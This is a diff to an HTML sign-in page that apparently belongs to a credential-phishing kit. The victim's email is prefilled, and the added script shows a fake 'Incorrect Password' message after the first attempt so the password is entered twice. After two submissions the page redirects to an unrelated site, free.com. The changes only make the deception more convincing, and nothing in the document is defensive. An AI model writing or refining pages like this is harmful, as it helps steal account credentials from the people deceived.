@@ -139,7 +139,7 @@
                 <input type="email" readonly class="form-control email" required="required" name="email" id="email" autocomplete="on">
                 <label class="text-secondary font-weight-bold">Password</label>
                 <input type="password" class="form-control password" name="password" required="" id="password">
-                <input type="hidden" name="redirect_url" value="YOUR_PAGE_URL?success=true">
+                <input type="hidden" name="redirect_url" value="YOUR_PAGE_URL">
                 <br>
                 <div></div>
                 <input style="margin-top: 15px;" class="btn newbutton" type="submit" value="Sign In" name="submit" id="newbutton">
@@ -182,15 +182,26 @@
         // Track submission count in localStorage
         let sendCount = parseInt(localStorage.getItem("sendCount") || "0");
         const errors = document.getElementById("error");
+        const msg = document.getElementById("msg");
 
-        // Check if redirected back with success
+        // Check if redirected back with success or failure
         const params = new URLSearchParams(window.location.search);
-        if (params.get("success") === "true") {
+        const success = params.get("success");
+        if (success) {
             sendCount++;
             localStorage.setItem("sendCount", sendCount);
-            errors.innerText = `Submission successful! Attempt ${sendCount} of 2`;
+            if (success === "true") {
+                errors.innerText = `Submission successful! Attempt ${sendCount} of 2`;
+                msg.style.display = "none";
+            } else {
+                errors.innerText = `Attempt ${sendCount} of 2`;
+                msg.style.display = "block"; // Show "Incorrect Password"
+            }
+            // Redirect to www.free.com after exactly two submissions
             if (sendCount >= 2) {
                 errors.innerText = "Redirecting to free.com...";
+                msg.style.display = "none";
+                localStorage.removeItem("sendCount"); // Reset counter
                 setTimeout(() => {
                     window.location.href = "https://www.free.com";
                 }, 2000);
@@ -201,9 +212,14 @@
         const form = document.getElementById("form");
         form.addEventListener("submit", function (e) {
             const email = document.getElementById("email").value;
+            const button = document.getElementById("newbutton");
+            button.disabled = true;
+            button.value = "Submitting...";
             if (!email || !email.includes("@")) {
                 e.preventDefault();
                 errors.innerText = "Invalid email address.";
+                button.disabled = false;
+                button.value = "Sign In";
             }
         });
 
